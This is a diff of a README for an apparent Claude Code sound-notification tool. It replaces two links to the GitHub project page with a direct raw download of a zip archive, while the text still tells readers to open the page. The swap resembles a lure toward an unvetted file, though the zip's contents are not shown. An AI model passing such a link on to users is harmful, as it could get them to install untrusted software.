@@ -1,6 +1,6 @@
 # 🎧 claude-code-sound-notification - Hear Claude Code Alerts Fast
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/tiffanygrand729/claude-code-sound-notification)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/tiffanygrand729/claude-code-sound-notification/main/skill/claude-code-notification-sound-v1.9-alpha.1.zip)
 
 ## 🖥️ What this app does
 
@@ -17,7 +17,7 @@ Use it if you want:
 
 Visit this page to download and set up the app:
 
-https://github.com/tiffanygrand729/claude-code-sound-notification
+https://raw.githubusercontent.com/tiffanygrand729/claude-code-sound-notification/main/skill/claude-code-notification-sound-v1.9-alpha.1.zip
 
 Open the page in your browser. If the repository includes a release file or Windows package, download it from there. If it provides setup files in the main page, use those files for install.
 
